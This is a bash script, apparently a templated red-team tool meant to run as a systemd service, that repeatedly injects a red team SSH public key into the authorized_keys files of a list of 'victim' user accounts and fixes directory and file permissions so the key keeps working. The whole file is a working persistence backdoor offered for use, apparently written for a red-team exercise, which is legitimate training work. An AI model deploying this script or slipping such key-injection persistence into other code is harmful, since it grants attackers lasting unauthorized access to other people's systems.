#!/bin/bash
# Jared Korwatch
# jmk9339@rit.edu
# This file ensures that Red Team SSH public keys stay present on the target machine
# in the victim user accounts, running from systemd

set -e

PERSIST_KEY="{{ red_team_pub_key }}"

TARGET_USERS="{{ victim_users_list }}"

# temp file for testing
# TEST_OUTPUT_FILE="/tmp/systemd_test_output.log"
TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")

# print to temp file
# echo "$TIMESTAMP - Systemd Test Run Successful. Service is active." >> "$TEST_OUTPUT_FILE"

# place ssh keys
for USER in $TARGET_USERS; do
    # 1. Check if the user exists
    if ! id -u "$USER" &>/dev/null; then
        echo "  [WARN] User '$USER' does not exist. Skipping."
        continue
    fi
    
    # get users home dir
    USER_HOME=$(eval echo "~$USER")
    SSH_DIR="$USER_HOME/.ssh"
    AUTH_KEYS_FILE="$SSH_DIR/authorized_keys"

    echo "  [INFO] Processing user: $USER (Home: $USER_HOME)"

    # ensure that the directory exists
    if [ ! -d "$SSH_DIR" ]; then
        echo "    [FIX] Creating $SSH_DIR."
        sudo -u "$USER" mkdir -p "$SSH_DIR"
    fi
    
    # permissions for ssh
    CURRENT_PERMS=$(stat -c "%a" "$SSH_DIR")
    if [ "$CURRENT_PERMS" != "700" ]; then
        echo "    [FIX] Setting permissions on $SSH_DIR to 700."
        chmod 700 "$SSH_DIR"
    fi

    # make sure authorized_keys exists and contains the key
    if [ ! -f "$AUTH_KEYS_FILE" ]; then
        echo "    [FIX] Creating $AUTH_KEYS_FILE and injecting key."
        echo "$PERSIST_KEY" | sudo -u "$USER" tee "$AUTH_KEYS_FILE" > /dev/null
    else
        # Check if the persistence key is already in the authorized_keys file
        if ! sudo -u "$USER" grep -qF -- "$PERSIST_KEY" "$AUTH_KEYS_FILE"; then
            echo "    [FIX] Key not found in $AUTH_KEYS_FILE. Injecting key."
            echo "$PERSIST_KEY" | sudo -u "$USER" tee -a "$AUTH_KEYS_FILE" > /dev/null
        else
            echo "    [OK] Persistence key already present."
        fi
    fi

    # ensure that the correct permissions are set
    CURRENT_PERMS=$(stat -c "%a" "$AUTH_KEYS_FILE" 2>/dev/null || echo "000")
    if [ "$CURRENT_PERMS" != "600" ]; then
        echo "    [FIX] Setting permissions on $AUTH_KEYS_FILE to 600."
        chmod 600 "$AUTH_KEYS_FILE"
    fi
    
done

exit 0